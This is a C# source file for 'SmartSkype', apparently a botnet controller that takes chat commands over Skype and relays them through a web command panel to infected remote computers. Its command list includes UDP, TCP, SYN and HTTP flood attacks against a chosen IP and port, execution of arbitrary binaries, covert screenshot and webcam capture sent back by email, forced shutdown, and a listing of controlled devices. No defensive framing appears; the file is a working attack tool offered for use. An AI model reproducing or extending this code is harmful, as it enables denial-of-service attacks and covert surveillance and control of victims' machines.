using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SKYPE4COMLib;
using System.Net;

namespace sBot
{
    class Program
    {
        static string[] commanda;
        private static Skype skypebot;
        static string trigger = ".";
        static string name = "SmartSkype";
        static void Main()
        {
            bot();
            Console.ReadLine();
        }

        private static void bot()
        {
            skypebot = new Skype();
            skypebot.Attach(7, false);
            skypebot.MessageStatus +=
                new _ISkypeEvents_MessageStatusEventHandler(skype_MessageStatus);
        }

        private static void skype_MessageStatus(ChatMessage msg,
                 TChatMessageStatus status)
        {
            if (msg.Body.IndexOf(trigger) == 0)
            {
                if (login(msg.Sender.Handle) == true)
                {

                    string command = msg.Body.Remove(0, trigger.Length);
                    commanda = command.Split(' ');

                    skypebot.SendMessage(msg.Sender.Handle, name +
                   " Says: " + ProcessCommand(commanda[0], msg.Sender.Handle));
                }
                else
                {
                    skypebot.SendMessage(msg.Sender.Handle, name +
                   " Says: Unrecognized user - " + msg.Sender.Handle);
                }
            }
        }

        private static bool login(string user)
        {
            WebClient web = new WebClient();
            string data = web.DownloadString("http://www.site.com/skype/login.php?user=" + user);
            if (data != "True")
            {
                return false;
            }
            else
            {
                return true;
            }

        }

        private static string message(string name)
        {
            string reply = "";
            string message = "";
            int length = commanda.Length;
            for (int i = 2; i < length; i++)
            {
                message = message + commanda[i] + " ";
            }
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=message" + "&instruction=MESSAGE:" + message);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=message" + "&instruction=MESSAGE:" + message);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to\n" + data;
            }

            return reply;
        }

        private static string OnlineUsers(string name)
        {
            WebClient DownloadUsers = new WebClient();
            return DownloadUsers.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
        }

        private static string ShutDown(string name)
        {
            string reply;
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=shutdown&instruction=SHUTDOWN:True");
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=shutdown&instruction=SHUTDOWN:True");
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string Visit(string name)
        {
            string reply;
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=visit&instruction=VISIT:" + commanda[2]);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=visit&instruction=VISIT:" + commanda[2]);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string Install(string name)
        {
            string reply;
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=INSTALL:" + commanda[2]);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=INSTALL:" + commanda[2]);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string Update(string name)
        {
            string reply;
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=UPDATE:" + commanda[2]);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=UPDATE:" + commanda[2]);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;

        }

        private static string Fresh(string name)
        {
            string reply;
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=FRESH:True");
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                reply = "Sorry Fresh command cannot currently be sent globally";
                //WebClient web = new WebClient();
                //string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=FRESH:True");
                //data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                //reply = "Command sent to " + data;
            }
            return reply;

        }

        private static string Speak(string name)
        {
            string reply;
            string message = "";
            int length = commanda.Length;
            for (int i = 2; i < length; i++)
            {
                message = message + commanda[i] + " ";
            }
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=speak&instruction=SPEAK:" + message);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=speak&instruction=SPEAK:" + message);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;

        }

        private static string Print(string name)
        {
            string reply;
            string message = "";
            int length = commanda.Length;
            for (int i = 2; i < length; i++)
            {
                message = message + commanda[i] + " ";
            }
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=print&instruction=PRINT:" + message);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=print&instruction=PRINT:" + message);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string UDP(string name)
        {
            string reply;

            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=udp&instruction=UDP:" + commanda[2] + ":" + commanda[3]);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=udp&instruction=UDP:" + commanda[2] + ":" + commanda[3]);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string TCP(string name)
        {
            string reply;

            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=tcp&instruction=TCP:" + commanda[2] + ":" + commanda[3]);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=tcp&instruction=TCP:" + commanda[2] + ":" + commanda[3]);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string SYN(string name)
        {
            string reply;

            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=syn&instruction=SYN:" + commanda[2] + ":" + commanda[3]);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=syn&instruction=SYN:" + commanda[2] + ":" + commanda[3]);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string HTTP(string name)
        {
            string reply;

            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=http&instruction=HTTP:" + commanda[2] + ":" + commanda[3]);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=http&instruction=HTTP:" + commanda[2] + ":" + commanda[3]);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string ScreenShot(string name)
        {
            string reply;
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=screenshot&instruction=SCREENSHOT:True");
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=screenshot&instruction=SCREENSHOT:True");
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string WebCam(string name)
        {
            string reply;
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=webcam&instruction=WEBCAM:True");
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=webcam&instruction=WEBCAM:True");
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string Beep(string name)
        {
            string reply;
            if (commanda[1] != "global")
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=beep&instruction=BEEP:" + commanda[2] + ":" + commanda[3]);
                reply = "Command sent to " + commanda[1];
            }
            else
            {
                WebClient web = new WebClient();
                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=beep&instruction=BEEP:" + commanda[2] + ":" + commanda[3]);
                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                reply = "Command sent to " + data;
            }
            return reply;
        }

        private static string EncodeTo64(string toEncode)
        {
            byte[] toEncodeAsBytes
                  = System.Text.ASCIIEncoding.ASCII.GetBytes(toEncode);
            string returnValue
                  = System.Convert.ToBase64String(toEncodeAsBytes);
            return returnValue;
        }

        private static string ProcessCommand(string str, string name)
        {
            string result = "";
            switch (str)
            {
                case "message":
                    result = message(name);
                    break;
                case "online":
                    result = OnlineUsers(name);
                    break;
                case "shutdown":
                    result = ShutDown(name);
                    break;
                case "visit":
                    result = Visit(name);
                    break;
                case "install":
                    result = Install(name);
                    break;
                case "update":
                    result = Update(name);
                    break;
                case "fresh":
                    result = Fresh(name);
                    break;
                case "speak":
                    result = Speak(name);
                    break;
                case "print":
                    result = Print(name);
                    break;
                case "udp":
                    result = UDP(name);
                    break;
                case "tcp":
                    result = TCP(name);
                    break;
                case "syn":
                    result = SYN(name);
                    break;
                case "http":
                    result = HTTP(name);
                    break;
                case "screenshot":
                    result = ScreenShot(name);
                    break;
                case "webcam":
                    result = WebCam(name);
                    break;
                case "beep":
                    result = Beep(name);
                    break;
                case "commands":
                    result = "Commands are - \n\n.commands\nDisplays all commands\n\n.help\nDisplays help info\n\n.message\nCreates a messagebox on remote computer\n\n.shutdown\nPowers down the remote computer\n\n.visit\nRemotely open webpage\n\n.update\nUpdate SmartSkype on remote computer and uninstalls current version\n\n.install\nExecute binary\n\n.fresh\nPlay fresh prince of belaire theme music\n\n.speak\nText to speach\n\nPrint text on remote computer\n\n.udp\nUDP network stress tester\n\n.tcp\nTCP network stress tester\n\n.syn\nSYN network stress tester\n\n.http\n HTTP network stress tester\n\n.stop\nStops any network stress tests\n\n.screenshot\nCaptures screenshot and emails\n\n.webcam\nCaptures from webcam and emails\n\n.beep\nCauses system beep\n\n.uninstall\nCompletely removes SmartSkype from remote computer\n\n.online\nShows a list of available devices to control";
                    break;
                case "help":
                    result = "Please foreward questions to support@coolsec.net or visit http://www.coolsec.net";
                    break;
                default:
                    result = "Sorry, I do not recognize your command";
                    break;

            }
            return result;

        }

    }
}
